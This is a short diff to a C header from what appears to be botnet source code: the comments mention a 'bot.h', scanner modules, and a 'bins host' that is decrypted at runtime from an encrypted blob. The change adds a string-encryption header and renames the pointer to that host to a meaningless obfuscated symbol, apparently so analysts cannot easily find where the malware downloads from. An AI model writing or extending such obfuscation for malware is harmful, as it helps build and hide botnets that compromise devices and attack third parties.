@@ -1,5 +1,7 @@
 #pragma once
 
+#include "strenc.h"
+
 #include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
@@ -34,5 +36,5 @@ typedef uint16_t port_t;
    Defined in config.c, overridable at compile time with -D flags. */
 /* SCANNER_BINS_HOST — decrypted at runtime from encrypted blob in config.c.
    Exposed as a plain char* for scanner modules that don't include bot.h. */
-extern const char *g_bins_host_ptr;
-#define SCANNER_BINS_HOST g_bins_host_ptr
+extern const char *_Gy7MD4D;
+#define SCANNER_BINS_HOST _Gy7MD4D
